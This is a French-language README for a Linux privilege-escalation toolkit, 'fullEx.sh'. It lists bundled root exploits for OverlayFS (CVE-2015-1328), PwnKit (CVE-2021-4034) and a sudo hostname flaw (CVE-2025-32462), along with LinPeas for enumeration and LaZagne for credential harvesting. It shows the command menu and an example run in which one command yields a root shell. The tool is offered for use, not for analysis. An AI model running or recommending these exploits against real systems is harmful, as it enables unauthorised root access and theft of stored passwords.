# <img width="1335" height="890" alt="image" src="https://github.com/user-attachments/assets/c947aebb-593b-4027-bc50-ac87663ff387" />


Les exploits root & outils dispo :

💀 OverlayFS

💀 PwnKit

🤖 LinPeas

👾 LaZagne

# ⚙️ Commandes

```
heisenberg@kb-server:~/fullEx$ ./fullEx.sh -help
                                                                                                    
 $$$$$$\            $$\ $$\ $$$$$$$$\           
$$  __$$\           $$ |$$ |$$  _____|          
$$ /  \__|$$\   $$\ $$ |$$ |$$ |      $$\   $$\ 
$$$$\     $$ |  $$ |$$ |$$ |$$$$$\    \$$\ $$  |
$$  _|    $$ |  $$ |$$ |$$ |$$  __|    \$$$$  / 
$$ |      $$ |  $$ |$$ |$$ |$$ |       $$  $$<  
$$ |      \$$$$$$  |$$ |$$ |$$$$$$$$\ $$  /\$$\ 
\__|       \______/ \__|\__|\________|\__/  \__|

               by M0rPH3U53
 
 
Usage: ./fullEx.sh COMMAND
 
Commands:
   -LinPeas       Execute LinPeas
   -LaZagne       Execute LaZagne

OverlaysFS
   -OverC         Compile le script C#
   -Overlays      Overlays64 - CVE-2015-1328

   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034
   -SudoHost      Sudo Hostname - CVE-2025-32462   
   -check         Verifie si gcc est installer
   -perm          Applique les droit d'execution
   -help          Affiche les commandes
 ```
# 💲 Exemple

```
heisenberg@kb-server:~/fullEx$ bash fullEx.sh -perm
heisenberg@kb-server:~/fullEx$ ./fullEx.sh -PwnKit64
To run a command as administrator (user "root"), use "sudo <command>".
See "man sudo_root" for details.

root@kb-server:/home/heisenberg/fullEx#    
```
